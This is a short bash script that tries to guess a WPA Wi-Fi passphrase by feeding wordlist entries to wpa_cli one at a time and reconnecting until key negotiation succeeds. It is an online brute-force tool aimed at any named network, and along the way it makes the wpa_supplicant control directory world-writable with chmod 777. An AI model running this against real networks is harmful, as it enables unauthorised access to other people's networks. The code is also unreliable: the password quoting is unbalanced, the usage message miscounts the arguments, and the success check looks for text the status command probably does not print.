#!/bin/bash

if [ $# -ne 4 ]; then
	echo "No arguments supplied. need 3 args: essid, file whith passwords, min pass length, restart wpa service"
	exit 1
fi

ESSID="\"$1\""
PASSFILE=$2
PASSLENGTH=$3
WPASRVMGNT=$4

echo "essid $ESSID"
if [ -a $PASSFILE ]; then
	echo "process file $PASSFILE"
else
	#clear
	echo "file not exist $PASSFILE"
	exit 1
fi
echo "length $PASSLENGTH"

if $WPASRVMGNT; then
	sudo service wpa_supplicant stop
	sudo service wpa_supplicant start
	sudo chmod -R 777 /var/run/wpa_supplicant
fi

sleep 1

echo "STATUS"
wpa_cli status

echo "ADD NETWORK"
wpa_cli add_network

echo "SET SSID"
wpa_cli set_network 0 ssid $ESSID

wpa_cli enable_network 0
wpa_cli list_networks

echo "START MAIN LOOP"
while read line
do
	linelength=${#line}
	if [[ $linelength -lt $PASSLENGTH ]]; then 
		#echo "length $linelength continue"
		continue
	fi

	echo "NEW PASS $line"
	wpa_cli set_network 0 psk "\"$line" > /dev/null 
	wpa_cli reconnect > /dev/null
	
	result=""
	sleep 8
	result=`wpa_cli status`
	echo $result
	#vartmp=`echo $result|grep "wpa_state=4WAY_HANDSHAKE"`
	vartmp=`echo $result|grep "WPA: Key negotiation completed"`
	if [ -n "$vartmp" ]; then
	#if [ -z "$vartmp" ]; then
		echo "found password $line"
		break
	fi

done < $PASSFILE 
echo "STOP MAIN LOOP"

wpa_cli remove_network 0
wpa_cli list_networks

if $WPASRVMGNT; then
	sudo service wpa_supplicant stop
fi
